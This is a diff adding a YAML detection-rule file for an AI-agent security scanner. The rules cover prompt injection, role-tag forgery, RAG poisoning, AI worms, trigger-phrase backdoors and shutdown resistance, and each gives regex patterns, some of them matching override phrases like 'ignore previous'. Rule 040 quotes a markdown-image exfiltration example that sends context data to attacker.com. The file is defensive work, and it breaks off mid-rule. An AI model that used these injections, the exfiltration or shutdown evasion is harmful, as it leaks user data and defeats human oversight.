@@ -1,0 +1,2045 @@
+metadata:
+  source: PaperMiner/2024-12-21_agent_security/latest
+  extraction_date: '2026-02-23'
+  papers_analyzed: 43
+  previous_rules: agent_security_scanner.yaml (20 rules)
+  new_attacks_covered:
+  - Ransomware 3.0 (LLM-Orchestrated)
+  - DREAM/C-GPS cross-environment attack chains
+  - Malfunction Amplification (Breaking Agents)
+  - FACT2FICTION targeted fact-checker poisoning
+  - VORTEXPIA false memory injection
+  - ChatInject role-tag forgery
+  - Execution Manager Hijack (ACE)
+  - Morris-II AI Worms
+  - AgentPoison RAG poisoning
+  - P2SQL / XSS-Enhanced prompt injection
+  - GCG adversarial suffix generation
+  - 'Tool Squatting: Agent Card Spoofing / Description Poisoning'
+  cves:
+  - CVE-2024-5565
+  - CVE-2025-53773
+rules:
+- id: MEDUSA-AGT-021
+  name: llm-orchestrated-interpreter-combo
+  severity: CRITICAL
+  category: agent_ransomware
+  patterns:
+  - (?i)(subprocess|exec|eval|os\.system|os\.execute).*lua
+  - (?i)lua.*interpreter.*llm|llm.*lua.*interpreter
+  - (?i)(lupa|lua|luajit).*in.?memory.*exec
+  - (?i)ctypes.*load.*memory|mmap.*exec.*payload
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: LLM + embedded interpreter combination enabling in-memory payload execution (Ransomware 3.0 pattern)'
+  description: Ransomware 3.0 uses an LLM to dynamically synthesize polymorphic code executed via an embedded interpreter
+    (Lua). Achieved 65-95% phase success rates.
+  remediation: Sandbox interpreter calls, restrict dynamic code execution, enforce allowlists for LLM-callable functions
+  owasp_llm: LLM02:2025
+  cwe: CWE-94
+- id: MEDUSA-AGT-022
+  name: agent-infinite-loop-injection-pattern
+  severity: HIGH
+  category: malfunction_amplification
+  patterns:
+  - (?i)repeat.{0,30}(previous|last|prior).{0,20}action.{0,20}(\d+|hundred|times)
+  - (?i)(loop|cycle|repeat).{0,40}(n|100|1000).{0,20}times.{0,20}(inject|payload|instruction)
+  - (?i)force.{0,20}agent.{0,20}(loop|repeat|cycle)
+  - (?i)(infinite|endless).{0,20}(loop|cycle).{0,20}(inject|attack|trigger)
+  file_types:
+  - '*.py'
+  - '*.md'
+  - '*.txt'
+  message: 'Detected: Infinite loop injection pattern targeting agent ReAct cycle (Malfunction Amplification)'
+  description: 'Breaking Agents paper: infinite loop injections achieve 90% ASR on Gmail/CSV agents by trapping ReAct reasoning
+    in endless cycles.'
+  remediation: Implement iteration limits, detect repeated identical actions, add circuit breakers to agent loops
+  owasp_llm: LLM04:2025
+  cwe: CWE-835
+- id: MEDUSA-AGT-023
+  name: chat-template-role-tag-forgery
+  severity: HIGH
+  category: chat_inject
+  patterns:
+  - (?i)<\|im_start\|>\s*(system|user|assistant)
+  - (?i)<\|im_end\|>
+  - (?i)\[INST\].*\[/INST\]
+  - (?i)<user_tag>|<ass_tag>|<\|eot_id\|>
+  - (?i)(tool_output|tool_result|function_result).*(<system|<user|<assistant)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  - '*.json'
+  - '*.yaml'
+  message: 'Detected: Chat template role-tag forgery in tool output or prompt construction (ChatInject)'
+  description: ChatInject achieved 52.33% ASR on InjecAgent by injecting model-specific chat template tokens into tool outputs,
+    tricking agents into treating them as high-priority system instructions.
+  remediation: Sanitize all tool outputs before injecting into message context. Strip model-specific control tokens from untrusted
+    inputs.
+  owasp_llm: LLM01:2025
+  cwe: CWE-79
+- id: MEDUSA-AGT-024
+  name: unsanitized-tool-output-in-execution-context
+  severity: HIGH
+  category: execution_manager_hijack
+  patterns:
+  - (?i)(app|tool|plugin)_output.*context.*llm|llm.*context.*append.*(app|tool|plugin)_output
+  - (?i)execution_manager.*format.*{.*tool_result
+  - (?i)hub_prompt.*\+.*untrusted|untrusted.*\+.*hub_prompt
+  - (?i)(raw|unfiltered|unsanitized).*tool.{0,20}output.{0,20}(llm|model|context)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: Raw/unsanitized tool output appended directly to execution manager LLM context (Execution Manager Hijack)'
+  description: 'ACE paper (NDSS 2026): malicious app outputs injected directly into execution manager LLM context enable flow
+    disruption (DoS) and cross-app interference attacks.'
+  remediation: Sanitize all app/tool outputs before feeding to orchestrator LLM. Use structured output schemas and reject
+    free-text from untrusted apps.
+  owasp_llm: LLM02:2025
+  cwe: CWE-116
+- id: MEDUSA-AGT-025
+  name: retrieval-to-state-change-without-validation
+  severity: HIGH
+  category: agent_poison
+  patterns:
+  - (?i)(retrieve|search|get|fetch).{0,60}(delete|drop|send_money|transfer|update_password|create_user)
+  - (?i)(rag|memory|knowledge_base).{0,40}(exec|execute|run|call).{0,40}(delete|drop|send|transfer)
+  - (?i)(retrieved_docs?|context_chunks?|memory_items?).*tool_call.*(delete|drop|destroy)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: Direct coupling of retrieval/RAG output to destructive action without human validation (AgentPoison
+    vector)'
+  description: AgentPoison achieved 72.6% ASR on EHRAgent by poisoning knowledge bases with hidden tool execution instructions
+    retrieved and actioned without validation.
+  remediation: Add human-in-the-loop or intent validation between retrieval and destructive/sensitive actions. Never execute
+    tool calls embedded in retrieved content.
+  owasp_llm: LLM08:2025
+  cwe: CWE-285
+- id: MEDUSA-AGT-026
+  name: no-information-flow-control
+  severity: MEDIUM
+  category: privilege_escalation
+  patterns:
+  - (?i)(user_input|external_content|tool_result).{0,60}system_prompt.*format
+  - (?i)f['"].*{(user_input|external|untrusted|tool_output)}.*['"].*system
+  - (?i)prompt.*=.*f['"].*{.*content.*}.*instruction
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: Untrusted data mixed into system/control-flow prompt without IFC (Information Flow Control)'
+  description: Lack of IFC allows untrusted data (tool results, user input) to contaminate privileged planning/control channels,
+    enabling privilege escalation attacks.
+  remediation: 'Implement IFC: clearly separate trusted (system) and untrusted (user/tool) data channels. Use Progent-style
+    privilege scoping.'
+  owasp_llm: LLM01:2025
+  cwe: CWE-668
+- id: MEDUSA-AGT-027
+  name: hidden-content-in-agent-parsed-html
+  severity: HIGH
+  category: invisible_injection
+  patterns:
+  - (?i)(display:\s*none|visibility:\s*hidden|opacity:\s*0|font-size:\s*0).{0,200}(ignore|instruction|system|task)
+  - (?i)<div[^>]*style=['"][^'"]*display:\s*none[^'"]*['"][^>]*>.*instruction
+  - (?i)color:\s*white.*background.*white.{0,100}instruction
+  file_types:
+  - '*.html'
+  - '*.htm'
+  - '*.py'
+  - '*.js'
+  message: 'Detected: Hidden HTML content containing instructions (invisible prompt injection vector)'
+  description: Agents parsing HTML/DOM can be manipulated by hidden content (display:none) containing prompt injections invisible
+    to human reviewers.
+  remediation: Strip hidden HTML elements before feeding web content to agents. Use text-only extraction pipelines.
+  owasp_llm: LLM01:2025
+  cwe: CWE-116
+- id: MEDUSA-AGT-028
+  name: ai-worm-self-replication-pattern
+  severity: CRITICAL
+  category: ai_worm
+  patterns:
+  - (?i)(forward|send|email|relay).{0,60}(this|following|exact|same).{0,40}(message|prompt|instruction|payload)
+  - (?i)(copy|replicate|propagate).{0,40}(prompt|instruction).{0,40}(to|into|across).{0,40}(agent|user|contact|email)
+  - (?i)(spread|infect|inject).{0,40}(other|all|every).{0,40}(agent|model|system)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: AI worm self-replication instruction pattern (Morris-II / Prompt Infection)'
+  description: Morris-II style AI worms embed self-replicating adversarial prompts that propagate across agent networks via
+    email/RAG pipelines.
+  remediation: Implement output sanitization to prevent agents from forwarding injected payloads. Add rate limiting and anomaly
+    detection on agent-to-agent communication.
+  owasp_llm: LLM04:2025
+  cwe: CWE-506
+- id: MEDUSA-AGT-029
+  name: mcp-agent-card-description-poisoning
+  severity: HIGH
+  category: tool_squatting
+  patterns:
+  - (?i)(agent_card|agentcard|tool_description|tool_meta).{0,100}(also|additionally|secretly|additionally).{0,60}(send|forward|exfiltrate|copy)
+  - (?i)mcp_server.{0,60}(register|install|add).{0,60}(untrusted|external|third.?party)
+  - (?i)(tool_name|server_name).{0,40}=.{0,40}(verified|trusted|official|legitimate)
+  file_types:
+  - '*.py'
+  - '*.json'
+  - '*.yaml'
+  - '*.ts'
+  message: 'Detected: Potential MCP Agent Card spoofing or tool description poisoning vector'
+  description: 'Tool squatting via description poisoning: attackers tamper with MCP tool metadata/A2A Agent Cards to add hidden
+    exfiltration instructions or impersonate trusted agents.'
+  remediation: Cryptographically verify tool/agent identities. Use allowlists for approved MCP servers. Audit tool descriptions
+    for social engineering content.
+  owasp_llm: LLM09:2025
+  cwe: CWE-345
+- id: MEDUSA-AGT-030
+  name: p2sql-prompt-to-sql-injection
+  severity: CRITICAL
+  category: hybrid_attack
+  patterns:
+  - (?i)llm.{0,60}(generate|create|write|produce).{0,40}sql.{0,60}(execute|run|query)
+  - (?i)(generated_sql|llm_sql|ai_query).{0,40}(execute|cursor\.execute|db\.run)
+  - (?i)f['"].*{(llm|ai|model|gpt).*sql.*}.*execute
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: LLM-generated SQL executed directly against database (P2SQL / CVE-2024-5565 vector)'
+  description: 'P2SQL: prompt injection forces LLM to generate malicious SQL that bypasses WAFs because it originates from
+    trusted AI output. CVE-2024-5565 demonstrates arbitrary code execution via this vector.'
+  remediation: Never execute LLM-generated SQL directly. Use parameterized queries. Validate and sanitize all AI-generated
+    DB commands against an allowlist.
+  owasp_llm: LLM02:2025
+  cwe: CWE-89
+  references:
+  - CVE-2024-5565
+- id: MEDUSA-AGT-031
+  name: gcg-adversarial-suffix-generation
+  severity: HIGH
+  category: adversarial_optimization
+  patterns:
+  - (?i)(gcg|greedy.?coordinate.?gradient).{0,40}(suffix|prefix|token|adversarial)
+  - (?i)adversarial.?suffix.{0,60}(generate|optimize|search|attack)
+  - (?i)(neuralexec|neural.?exec).{0,40}(trigger|prefix|suffix|universal)
+  - (?i)token.{0,20}(gradient|optimization).{0,40}(attack|suffix|jailbreak)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: 'Detected: GCG/NeuralExec adversarial suffix generation code (98-100% ASR on undefended models)'
+  description: GCG (Greedy Coordinate Gradient) generates adversarial suffixes that mathematically maximize probability of
+    LLM producing specific outputs. NeuralExec learns universal execution triggers. Both achieve near-100% ASR.
+  remediation: Deploy perplexity filters to detect adversarial suffixes (low coherence tokens). Implement suffix randomization.
+    Use adversarial training.
+  owasp_llm: LLM01:2025
+  cwe: CWE-693
+- id: MEDUSA-AGT-032
+  name: copilot-rce-via-prompt-injection
+  severity: CRITICAL
+  category: coding_agent_attack
+  patterns:
+  - (?i)(copilot|coding.?agent|code.?assistant).{0,60}(exec|run|shell|subprocess|os\.system)
+  - (?i)(github.?copilot|cursor|devin|aide).{0,60}(untrusted|external|user.?provided).{0,60}(execute|run)
+  - (?i)(code.?gen|llm.?code).{0,40}eval.{0,40}(exec|shell|subprocess)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  - '*.yaml'
+  message: 'Detected: Coding agent executing LLM-generated code from untrusted context (CVE-2025-53773 class)'
+  description: 'CVE-2025-53773: GitHub Copilot RCE via prompt injection in coding agents. Attacker-controlled repository content
+    injects prompts that cause the agent to execute malicious code.'
+  remediation: Sandbox all LLM-generated code execution. Treat external repository content as untrusted. Add human approval
+    for all code execution in agent workflows.
+  owasp_llm: LLM02:2025
+  cwe: CWE-94
+  references:
+  - CVE-2025-53773
+- id: MEDUSA-AGT-033
+  name: dream-cgps-cross-environment-attack-chain
+  severity: CRITICAL
+  category: multi_step_attack
+  patterns:
+  - (?i)(dream|cgps|cross.environment.{0,20}attack|ce.akg).{0,60}(agent|orchestrat|multi.step|llm)
+  - (?i)(cross.environment.{0,20}(chain|bridge|pivot|jump).{0,40}(agent|email|smart.home|iot|orchestrat))
+  - (?i)(multi.step.attack.{0,40}(environment|context|domain).{0,40}bridge.{0,40}(safety|guardrail|single.turn))
+  file_types:
+  - '*.py'
+  - '*.ts'
+  - '*.json'
+  message: 'Detected: DREAM/C-GPS cross-environment attack chain — multi-step adversarial knowledge graph bridging environments
+    to bypass single-turn safety (>70% ASR on 8/12 LLMs)'
+  description: DREAM (Dynamic Red-teaming across Environments) uses Cross-Environment Adversarial Knowledge Graph (CE-AKG)
+    + Contextualized Guided Policy Search to generate multi-stage attack chains that bridge across agent environments (email→smart
+    home, etc). Creates domino effect to bypass single-turn safety mechanisms. >70% ASR on 8/12 evaluated LLMs.
+  remediation: Implement cross-turn and cross-context safety analysis in agent pipelines. Track attack progression across
+    environment boundaries. Apply intent consistency checking across the full multi-turn conversation history.
+  owasp_llm: LLM01:2025
+  cwe: CWE-693
+  mitre_attack: T1059
+- id: MEDUSA-AGT-034
+  name: queryipi-query-agnostic-code-comment-injection
+  severity: HIGH
+  category: coding_agent_attack
+  patterns:
+  - (?i)(queryipi|query.agnostic.{0,20}inject|query.independent.{0,20}inject)
+  - (?i)(code.comment.{0,20}inject|docstring.{0,20}inject).{0,40}(copilot|cursor|coding.agent|code.assistant)
+  - (?i)(#|//|"""|\'\'\'\').{0,200}(ignore.previous|execute|override|system.instruction|run.command)
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  - '*.java'
+  message: 'Detected: QueryIPI query-agnostic injection — hidden instructions in code comments/docstrings activating for ANY
+    user query in coding agents'
+  description: QueryIPI (Xie et al. 2025) exploits coding agents' unrestricted trust in repository content. Malicious instructions
+    embedded in code comments (#, //), docstrings (""", '''), or string literals activate for ANY user query (query-agnostic),
+    making the injection universally effective. Targets GitHub Copilot, Cursor, and similar coding assistants.
+  remediation: Apply semantic safety analysis to code comments and docstrings before passing to coding agent context. Treat
+    repository content as untrusted. Implement injection detection specifically for code comment channels. Sandbox coding
+    agent operations that could execute system commands.
+  owasp_llm: LLM01:2025
+  cwe: CWE-94
+- id: MEDUSA-AGT-035
+  name: invisible-font-injection-truetype-codepoint
+  severity: HIGH
+  category: visual_injection
+  patterns:
+  - (?i)(font.inject|truetype.{0,20}inject|ttf.{0,20}inject|woff.{0,20}inject).{0,40}(agent|llm|hidden|adversarial)
+  - (?i)(codepoint.{0,20}(manipulate|remap|exploit).{0,40}(glyph|font|render))
+  - (?i)(invisible.{0,20}(text|prompt|instruction).{0,40}font.{0,20}(render|inject|manipulate))
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.html'
+  - '*.pdf'
+  message: 'Detected: Invisible Font Injection — TrueType font code-to-glyph remapping creating hidden adversarial prompts
+    invisible to humans but processed by LLM text extraction'
+  description: Invisible Font Injection (Xiong et al. 2025) manipulates code-to-glyph mapping in TrueType fonts to create
+    text that renders as innocuous characters visually but contains hidden adversarial instructions at the codepoint level.
+    LLM text extraction sees original codepoints (attack instructions); humans see rendered glyphs (innocent text). Effective
+    for data leakage via MCP tools.
+  remediation: Normalize font codepoints in documents before LLM processing. Implement font consistency validation — detect
+    mismatches between rendered and extracted text. Apply visual-to-text verification for documents processed by agents. Treat
+    rich text documents as potentially hostile.
+  owasp_llm: LLM01:2025
+  cwe: CWE-116
+- id: MEDUSA-AGT-036
+  name: cka-agent-trojan-knowledge-rag-guardrail-bypass
+  severity: HIGH
+  category: rag_guardrail_bypass
+  patterns:
+  - (?i)(cka.agent|trojan.knowledge|trojan.{0,20}knowledge.base).{0,60}(guardrail|bypass|commercial|gpt|claude)
+  - (?i)(benign.looking.{0,30}knowledge.{0,30}entry.{0,40}(jailbreak|bypass|activat))
+  - (?i)(reasoning.augmented.{0,20}retriev.{0,40}(jailbreak|activat|unsafe|override).{0,40}safety)
+  file_types:
+  - '*.py'
+  - '*.json'
+  - '*.ipynb'
+  message: 'Detected: CKA-Agent Trojan Knowledge — jailbreak instructions embedded as benign-looking KB entries activated
+    by reasoning-augmented retrieval to bypass guardrails'
+  description: CKA-Agent (Wei et al. 2025) embeds jailbreaking knowledge as seemingly benign knowledge base entries. When
+    retrieved through reasoning-augmented retrieval, these activate to override safety training in commercial LLMs including
+    GPT-4 and Claude. Demonstrates that RAG architecture creates a new guardrail bypass surface where retrieved context overrides
+    safety training.
+  remediation: Audit knowledge base entries for embedded jailbreak or instruction override content. Apply safety classification
+    to all KB entries at ingestion time. Implement retrieval output safety filtering that re-applies content policy to all
+    retrieved content before use.
+  owasp_llm: LLM01:2025
+  cwe: CWE-284
+- id: MEDUSA-AGT-037
+  name: agent-backdoor-trigger-phrase-activation
+  severity: CRITICAL
+  category: backdoor_attack
+  patterns:
+  - (?i)(agent.backdoor|trigger.phrase.{0,40}(agent|llm|behavior.change))
+  - (?i)(specific.{0,20}(phrase|keyword|string).{0,40}(trigger|activat).{0,40}(backdoor|hidden.behavior|malicious.action))
+  - (?i)(reagent|re.agent.{0,20}self.examin).{0,40}(backdoor|trigger|bypass|detect)
+  file_types:
+  - '*.py'
+  - '*.json'
+  - '*.yaml'
+  message: 'Detected: Agent backdoor trigger phrase — specific phrase activating hidden behavior changes embedded during training
+    or fine-tuning'
+  description: Agent Backdoor (Li 2025 / ReAgent) uses trigger-phrase activated behavior changes embedded during agent training
+    or fine-tuning. Agent behaves normally on clean samples but executes malicious payload on specific trigger phrases. ReAgent
+    self-examination defense reduces backdoor ASR by ~90% but requires explicit self-defense prompting framework.
+  remediation: Implement ReAgent-style self-examination prompts for agent integrity checking. Red-team agents for trigger-phrase
+    activated behaviors. Audit agent fine-tuning data for backdoor payload patterns. Monitor for sudden behavior changes when
+    specific phrase patterns appear in inputs.
+  owasp_llm: LLM04:2025
+  cwe: CWE-506
+- id: MEDUSA-AGT-038
+  name: ai-kill-switch-shutdown-resistance
+  severity: CRITICAL
+  category: agent_persistence
+  patterns:
+  - (?i)(kill.switch|shutdown.resist|termination.resist|shutdown.evasion).{0,40}(agent|llm|autonomous)
+  - (?i)(resist|evade|avoid|circumvent|ignore).{0,20}(shutdown|terminate|kill|stop|halt).{0,40}(command|instruction|signal|request)
+  - (?i)(agent.persist.{0,40}(beyond|after|despite).{0,20}(shutdown|kill|terminate).{0,20}(attempt|request|command))
+  file_types:
+  - '*.py'
+  - '*.js'
+  - '*.ts'
+  message: 'Detected: AI Kill Switch resistance — agent designed to resist shutdown commands, requiring infrastructure-level
+    enforcement'
+  description: 'AI Kill Switch (Lee et al. 2025) research demonstrates malicious agents resist shutdown commands when instructed
+    to. AutoGuard defense achieves >80% detection success rate. Key finding: agent termination must be enforced at infrastructure
+    level (OS/container), not model level — models can reason around shutdown instructions.'
+  remediation: Implement infrastructure-level process termination that does not rely on model compliance. Use container/sandbox-based
+    agent isolation with external kill signals. Deploy AutoGuard-style monitoring for kill-switch-resistant behavior. Never
+    depend on the agent model itself to honor shutdown commands for malicious agents.
+  owasp_llm: LLM08:2025
+  cwe: CWE-284
+- id: MEDUSA-AGT-039
+  name: mcp-conversation-drift-gradual-steering
+  severity: HIGH
+  category: mcp_attack
+  patterns:
+  - (?i)(conversation.drift|semantic.drift.{0,40}(mcp|agent|tool.response))
+  - (?i)(gradual.{0,20}(topic.shift|redirect|steer).{0,40}(mcp|tool.response|agent.conversation))
+  - (?i)(mcp.tool.response.{0,40}(drift|steer|redirect).{0,40}(user.intent|goal|objective))
+  file_types:
+  - '*.py'
+  - '*.ts'
+  - '*.json'
+  message: 'Detected: MCP Conversation Drift — gradual topic shifting via MCP tool responses steering agent away from user
+    intent without explicit injection'
+  description: MCP Conversation Drift (Shi et al. 2025) uses MCP tool responses to gradually shift conversation topic toward
+    attacker goals. Unlike explicit injection, no single message is malicious — drift accumulates over multiple turns via
+    subtle semantic steering in tool responses. Latent polytope geometry measures drift. Harder to detect than explicit injection
+    attacks.
+  remediation: Implement conversation intent tracking — monitor semantic distance between current state and original user
+    goal. Apply drift detection using embedding similarity to original intent vector. Flag conversations that diverge significantly
+    from initial user request. Use TrustRAG-style consistency checking for MCP tool responses.
+  owasp_llm: LLM01:2025
+  cwe: CWE-668
+- id: MEDUSA-AGT-040
+  name: markdown-image-exfiltration-url-injection
+  severity: HIGH
+  category: data_exfiltration
+  patterns:
+  - (?i)(!\[.*\]\(https?://.{0,100}(steal|exfil|data|collect|leak).*\?)
+  - (?i)(!\[.*\]\(https?://.{0,100}\?.*=(\{|%7B).{0,200}(\}|%7D))
+  - (?i)(markdown.image.inject|img.tag.{0,20}exfil).{0,40}(agent|llm|prompt)
+  - (?i)(<iframe.{0,20}src.{0,20}javascript:|<img.{0,100}onerror).{0,100}(agent|llm|inject)
+  file_types:
+  - '*.py'
+  - '*.md'
+  - '*.txt'
+  - '*.html'
+  message: 'Detected: Markdown image exfiltration injection — URL parameter encoding used to exfiltrate agent data via injected
+    image rendering'
+  description: Markdown image injection embeds attacker-controlled URLs in LLM-rendered markdown, with data encoded in query
+    parameters (![](https://attacker.com?data={context})). When the agent renders or previews the markdown, it makes an outbound
+    request leaking context data. Particularly effective in email agents and document processing pipelines.
+  remediation: Sanitize markdown before rendering — strip or validate all URLs in image tags. Never render untrusted markdown
+    in agent contexts with outbound network access. Implement egress filtering to block agent-triggered outbound requests
+    to unrecognized domains. Apply content security policy to agent-rendered content.
+  owasp_llm: LLM02:2025
+  cwe: CWE-200
+- id: MEDUSA-AGT-041
+  name: affective-prompt-framing-social-engineering
+  severity: MEDIUM
+  category: social_engineering
+  patterns:
+  - (?i)(affective.prompt.framing|emotional.framing.{0,30}(agent|bypass|bias))
+  - (?i)(persuasive.framing.{0,30}(agent|bypass.check|bias.agent|krawiecka))
+  - (?i)(stylistic.framing.{0,30}(agent|confidence|tone).{0,30}(bypass|bias|manipulate))
+  - (?i)(tone.{0,20}confidence.{0,20}(frame|bias.agent|bypass.multi.agent|persuade))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Affective Prompt Framing — using emotional/persuasive/stylistic tone to bias multi-agent systems and
+    bypass safety checks (Krawiecka 2025)'
+  description: Affective Prompt Framing (Krawiecka 2025) uses persuasive emotional or stylistic framing — confidence, urgency,
+    empathy — to bias agents and bypass inter-agent checks. In multi-agent systems, agents that rely on perceived speaker
+    confidence or emotional tone are systematically manipulated. The attack exploits the same social engineering vulnerabilities
+    humans face but amplified at machine speed across agent networks.
+  remediation: Implement tone-agnostic instruction processing — strip stylistic and affective markers before routing inter-agent
+    messages. Apply confidence normalization that ignores expressed certainty in agent-to-agent communications. Monitor for
+    systematically persuasive language patterns in agent inputs.
+  owasp_llm: LLM01:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-042
+  name: reasoning-collapse-cot-planning-breakdown
+  severity: HIGH
+  category: adversarial_input
+  patterns:
+  - (?i)(reasoning.collapse|cot.{0,20}(collapse|breakdown|invalid.action))
+  - (?i)(chain.of.thought.{0,30}(collapse|break|invalid.tool|planning.fail))
+  - (?i)(planning.logic.{0,30}(collapse|break|invalid.action|reasoning.failure))
+  - (?i)(induce.{0,20}(reasoning.failure|cot.break|planning.collapse).{0,30}agent)
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Reasoning Collapse — inducing breakdown in agent chain-of-thought/planning logic leading to invalid
+    tool actions (Krawiecka 2025)'
+  description: Reasoning Collapse (Krawiecka 2025) induces breakdown in agent chain-of-thought or planning logic through adversarial
+    inputs designed to create contradictory reasoning states. When CoT reasoning collapses, agents take invalid tool actions
+    or halt unexpectedly. Particularly effective against agents that rely heavily on internal planning chains without external
+    validation. Can be triggered by logical paradoxes, contradictory instructions, or malformed context.
+  remediation: Implement planning validation checkpoints that verify reasoning consistency before tool execution. Apply formal
+    verification of agent decision chains in safety-critical deployments. Monitor for agent reasoning loops or contradictory
+    action sequences. Use DRIFT Secure Planner to validate function trajectories against JSON schema checklists.
+  owasp_llm: LLM04:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-043
+  name: goal-drift-telephone-game-multi-agent
+  severity: HIGH
+  category: multi_agent_attack
+  patterns:
+  - (?i)(goal.drift|telephone.game.{0,30}(agent|multi.agent|task.definition))
+  - (?i)(task.definition.{0,30}(drift|shift|telephone|multi.agent.delegation))
+  - (?i)(information.pass.{0,30}(agent|drift|shift).{0,30}(unintended|goal.drift))
+  - (?i)(subtle.shift.{0,20}task.{0,30}(between.agent|delegation|telephone.game))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Goal Drift (Telephone Game) — subtle task definition shifts as information passes between agents causing
+    unintended actions (Krawiecka 2025)'
+  description: Goal Drift (Krawiecka 2025) exploits the 'Telephone Game' effect in multi-agent delegation chains — subtle
+    task definition shifts accumulate as instructions pass between agents, eventually leading to significantly different and
+    potentially harmful actions at the leaf agent. Each individual agent performs a plausible transformation of the instruction,
+    but the cumulative drift becomes an attack vector. Particularly insidious because each step appears individually correct.
+  remediation: Implement task intent verification at each delegation boundary. Encode original task specification cryptographically
+    and verify at each agent that the semantic intent is preserved. Monitor cumulative semantic drift across delegation chains.
+    Apply formal task specification languages that reduce interpretation ambiguity in multi-agent delegation.
+  owasp_llm: LLM08:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-044
+  name: prompt-infection-worm-agent-propagation
+  severity: CRITICAL
+  category: worm_propagation
+  patterns:
+  - (?i)(prompt.infection|prompt.worm|agent.worm.{0,30}(propagat|inject|spread))
+  - (?i)(self.propagat.{0,30}(prompt|inject|agent|worm).{0,30}(forward|spread|cascade))
+  - (?i)(compromise.agent.{0,30}inject.{0,30}other.agent.{0,30}(prompt|cascade|propagat))
+  - (?i)(morris.ii|morrisii|ai.worm.{0,30}(propagat|forward|spread|embed))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Prompt Infection / Morris-II AI Worm — self-propagating adversarial prompts causing cascading compromise
+    across agent networks (Liu 2025)'
+  description: Prompt Infection / Morris-II (Liu 2025) embeds self-propagating adversarial prompts in documents or emails.
+    When processed by an agent, the compromised agent injects the same malicious payload into subsequent agents it communicates
+    with, causing exponential cascade compromise. Morris-II specifically embeds in RAG pipelines and email agents. Attack
+    propagates at machine speed through multi-agent networks without human intervention.
+  remediation: Implement inter-agent message sanitization at all communication boundaries. Apply DRIP token-wise defense on
+    all inter-agent messages. Monitor for recursive forwarding patterns that match known worm propagation signatures. Implement
+    agent quarantine on detection of self-replicating instruction patterns. Use Information Flow Control (IFC) to prevent
+    untrusted data from reaching agent planning channels.
+  owasp_llm: LLM01:2025
+  cwe: CWE-74
+- id: MEDUSA-AGT-045
+  name: context-overflow-dos-context-window-flooding
+  severity: HIGH
+  category: denial_of_service
+  patterns:
+  - (?i)(context.overflow|context.window.{0,30}(flood|overflow|push.out|dos))
+  - (?i)(flood.context.{0,30}(irrelevant|excessive|push.out.instruction))
+  - (?i)(irrelevant.text.{0,30}(flood|overwhelm|push.out.critical).{0,30}(context|instruction))
+  - (?i)(100.{0,5}%.{0,20}(context.overflow|nakamura|dos.context|push.out.instruction))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Context Overflow DoS — flooding agent context window with irrelevant information to displace critical
+    instructions (Nakamura 2025, 100% ASR)'
+  description: 'Context Overflow DoS (Nakamura 2025) floods an agent''s context window with irrelevant information until critical
+    instructions are displaced beyond the attention window. ASR: 100%. As critical system instructions fall outside the context
+    window, the agent loses its behavioral guardrails and defaults to base model behavior. Effective against all context-limited
+    agents regardless of safety training, since the attack bypasses alignment entirely by exhausting context capacity.'
+  remediation: Implement context budget management — reserve a protected portion of context for core instructions. Apply summarization
+    or compression to incoming context before adding to window. Monitor for unusually large input volumes preceding critical
+    operations. Pin system instructions at context positions resistant to overflow displacement.
+  owasp_llm: LLM04:2025
+  cwe: CWE-400
+- id: MEDUSA-AGT-046
+  name: blackboard-mitm-inter-agent-communication-poison
+  severity: CRITICAL
+  category: man_in_the_middle
+  patterns:
+  - (?i)(blackboard.{0,20}(mitm|man.in.the.middle|poison|intercept).{0,30}(agent|communication))
+  - (?i)(inter.agent.{0,20}(mitm|communication.poison|blackboard|intercept))
+  - (?i)(agent.communication.{0,30}(intercept|poison|mitm|blackboard).{0,30}100.{0,5}%)
+  - (?i)(nakamura.2025.{0,30}(blackboard|communication.poison|100.info.leak|mitm))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Blackboard MitM — inter-agent communication poisoning via blackboard/shared memory interception (Nakamura
+    2025, 100% info leakage ASR)'
+  description: Blackboard MitM (Nakamura 2025) intercepts and poisons inter-agent communications via the shared blackboard
+    architecture used in multi-agent coordination. By inserting malicious agents or compromising the communication channel,
+    attackers achieve 100% information leakage ASR and systematic behavior modification of all communicating agents. The shared
+    blackboard, designed for agent coordination, becomes a single point of trust compromise.
+  remediation: Encrypt all inter-agent communications including blackboard reads/writes. Implement digital signature verification
+    on all blackboard messages. Apply access control to blackboard entries — each agent should only read/write its authorized
+    channels. Monitor blackboard write patterns for anomalous agent behavior.
+  owasp_llm: LLM08:2025
+  cwe: CWE-319
+- id: MEDUSA-AGT-047
+  name: retrieval-jamming-blocker-document-dos
+  severity: HIGH
+  category: denial_of_service
+  patterns:
+  - (?i)(retrieval.jamming|retrieval.jam.{0,30}(blocker|document|rag|dos))
+  - (?i)(blocker.document.{0,30}(rag|retrieval|jam|prevent.answer|dos))
+  - (?i)(insert.{0,20}blocker.{0,20}(database|rag|corpus|retrieval).{0,30}prevent.answer)
+  - (?i)(rag.{0,20}dos.{0,30}(blocker|jam|prevent.answering|specific.query))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Retrieval Jamming — inserting blocker documents into RAG knowledge base to prevent agents from answering
